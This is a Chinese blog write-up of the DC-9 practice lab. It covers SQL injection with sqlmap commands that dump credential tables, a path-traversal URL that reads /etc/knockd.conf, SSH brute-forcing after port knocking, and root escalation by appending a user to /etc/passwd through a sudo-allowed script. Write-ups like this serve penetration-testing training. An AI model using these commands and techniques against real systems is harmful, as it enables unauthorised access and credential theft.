---
link: https://blog.csdn.net/2403_88102829/article/details/157686845
title: dc9打靶报告
description: 记录 DC-9 靶机从 Web 信息收集、SQL 注入和文件包含，到端口敲门开启 SSH、凭据利用及本地提权的完整链路。
excerpt: 记录 DC-9 靶机从 Web 信息收集、SQL 注入和文件包含，到端口敲门开启 SSH、凭据利用及本地提权的完整链路。
keywords: 网络,安全性测试
author: Lee
date: 2026-02-05T03:02:56.341Z
categories:
  - 靶场复现
tags:
  - DC靶场
  - 端口敲门
  - 文件包含
---

环境：

攻击机Kali IP: 192.168.145.128

扫描局域网发现存活主机

![](https://i-blog.csdnimg.cn/direct/bf7afd824d4044eb83caf2f493bd58df.png)

nmap看dc9开放端口

![](https://i-blog.csdnimg.cn/direct/84da8c38c2d94c1ba013217897e5cee9.png)

**回显：**22端口关闭，80端口开放（Apache服务/2.4.38）

whatweb进一步探查，确定无cms，是自定义网页

![](https://i-blog.csdnimg.cn/direct/06335f1c7add4925b01295cf424edee4.png)

看一下页面长这样

![](https://i-blog.csdnimg.cn/direct/23765c075ee84d4e992b9c83e2974c84.png)

disearch扫一下子url

![](https://i-blog.csdnimg.cn/direct/83b1cc2101604ad1a67400a3c91566e2.png)

有用的页面如下

![](https://i-blog.csdnimg.cn/direct/8c6a50021e834c71aa01b3210e451b08.png)

![](https://i-blog.csdnimg.cn/direct/55c2e891c8bc4d1fa148e8becc231ff1.png)

![](https://i-blog.csdnimg.cn/direct/6ee0677b43af4730a67cf675c74fff99.png)

发现一个search输入框

![](https://i-blog.csdnimg.cn/direct/56d7ca2d959144199ce39d0661ad4e4a.png)

测试永真永假语句发现回显不一样，说明存在sql注入点

![](https://i-blog.csdnimg.cn/direct/00694863e6cc4866b40022b762ea8323.png)

![](https://i-blog.csdnimg.cn/direct/27dc9e631af34022b54b68667078eb3b.png)

![](https://i-blog.csdnimg.cn/direct/61fb0d22a7bc4b26b2314eba08693726.png)

![](https://i-blog.csdnimg.cn/direct/e1e4782d24c14b04bd4f7489a39b4e59.png)

看一下源码，确定是post

![](https://i-blog.csdnimg.cn/direct/d97d27dab54949f3aa29c1993ec68a5b.png)

所以用sqlmap，向search.php发送post请求，在名为 `search`的字段里测试注入，下面所有的sqlmap语句均先用1这个值作为基础

先查询库名

sqlmap -u "http://192.168.145.191/results.php" --data="search=1" --dbs"

![](https://i-blog.csdnimg.cn/direct/ceffef440d1a4ed19e2754c9f450af79.png)

发现三个库

先看看users表里面

![](https://i-blog.csdnimg.cn/direct/6aabd438c5914364b4cd38b459110940.png)

有用户和密码，再往里爆一层，我们只导出用户名和密码

sqlmap -u "http://192.168.145.191/results.php" --data="search=1" -D users -T UserDetails -C "username,password" --dump --batch

![](https://i-blog.csdnimg.cn/direct/e1b6cd9235e241ed9e74421f05427224.png)

分别都做成文件先存起来，之前ssh没开，目前无法使用hydra爆破

![](https://i-blog.csdnimg.cn/direct/90054770d4634fa8835401defd919c89.png)

先继续搜

sqlmap -u "http://192.168.145.191/results.php" --data="search=1" -D Staff --tables --batch

看到Staff库里有两个表

![](https://i-blog.csdnimg.cn/direct/f62d41e065ea4c04be78fcd61b1a7f10.png)

看看第一个表里有什么

sqlmap -u "http://192.168.145.191/results.php" --data="search=1" -D Staff -T StaffDetails --columns --batch

![](https://i-blog.csdnimg.cn/direct/d355f50b47cf419c8d4b3befdceb1024.png)

用户名：

继续看users里面有什么

sqlmap -u "http://192.168.145.191/results.php" --data="search=1" -D Staff -T Users --columns --batch

爆出来三个字符段——密码，id，名字
![](https://i-blog.csdnimg.cn/direct/b6a2e1834019403dab183556bffe5f3f.png)

sqlmap -u "http://192.168.145.191/results.php" --data="search=1" -D Staff -T Users --dump --batch

继续爆下去

![](https://i-blog.csdnimg.cn/direct/b2521ff6d63f426399d072057c54da02.png)

得到admin的密码，附一个破解哈希密码的网址[CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.](https://crackstation.net/ "CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.")

![](https://i-blog.csdnimg.cn/direct/64c9e4cc9c6245788d2ebdfbfb429db3.png)

得到密码transorbital1

![](https://i-blog.csdnimg.cn/direct/514bbebc948b4c72928d8db6a8049495.png)

5. 登录后台

![](https://i-blog.csdnimg.cn/direct/6e2232335a024e099d1bb874a34fea85.png)

测试是否存在文件包含漏洞

![](https://i-blog.csdnimg.cn/direct/6ee84a115bed4b82b566a87256488cdf.png)

存在文件包含漏洞，通过参数file可以读取任意文件，刚开始nmap的时候，可以知道负责ssh的22端口没开，我们现在要通过端口敲门把他打开

http://192.168.145.191/addrecord.php/?file=../../../../../../etc/knockd.conf

![](https://i-blog.csdnimg.cn/direct/d3154674b3ce46b7bde4e24e78d2b436.png)

获得了端口敲门序列

打开SSH：7469 → 8475 → 9842 正向
关闭SSH：9842 → 8475 → 7469 反向

使用nc按序列敲门触发防火墙规则，打开了22端口

** `-z`** = zero-I/O模式（只连接，不发送数据）

只测试端口是否可连接

连接成功立即断开

不进行数据交互

![](https://i-blog.csdnimg.cn/direct/3af74201d6d04d0fbcfcf039fe4c227b.png)

然后我们现在就可以用hydra爆破了

得到三组用户以及密码

![](https://i-blog.csdnimg.cn/direct/966f9c7291694da9875199058568dc7d.png)

逐个进去看，都没有什么有用信息，到了janitor之后多了一个有secrets的目录，进去看看

![](https://i-blog.csdnimg.cn/direct/1c6bb7a293f64b0b9e1d6a03d9fcd1c3.png)

发现又多了几个密码，加到密码列表里继续爆破

![](https://i-blog.csdnimg.cn/direct/c212b68cc7a24f9a875b67c9b12a034b.png)

![](https://i-blog.csdnimg.cn/direct/bd8606a3cb904acd90864e345767a37b.png)

再爆破一遍，得到了新的账户密码——fredf

![](https://i-blog.csdnimg.cn/direct/c8095c4b50644b3a9f16291e565ef040.png)

远程连接成功登录

![](https://i-blog.csdnimg.cn/direct/00c68a5496fe4709b7532ac4e495ab6b.png)

查看 `sudo -l`：发现可执行 `/opt/devstuff/dist/test/test`（root权限）

![](https://i-blog.csdnimg.cn/direct/674d1a0a17684947b41c9080d8439bc4.png)

进去

![](https://i-blog.csdnimg.cn/direct/e4825b896cb945b9b1330b03c5138c25.png)

我们来分析一下脚本内容，大致是把第一个打开的文件给加到第二个后面，因为这个脚本是以root运行的，所以我们可以利用它来修改系统文件——/etc/passwd

```
f = open(sys.argv[1], "r")     # 打开第一个
output = (f.read())            # 读取全部内容

f = open(sys.argv[2], "a")     # 打开第二个
f.write(output)                # 将读取的内容写入
f.close()v
```

所以直接创建一个root用户提权，用openssl passwd 把密码加密加盐

![](https://i-blog.csdnimg.cn/direct/f8ecf9f946d1496c9913122c79c28310.png)

![](https://i-blog.csdnimg.cn/direct/23494206c4de4886b6e3eb25d695a2d6.png)

成功

![](https://i-blog.csdnimg.cn/direct/2ba6629357a5410ba235d8be2d4e778b.png)

完结撒花！！❀！
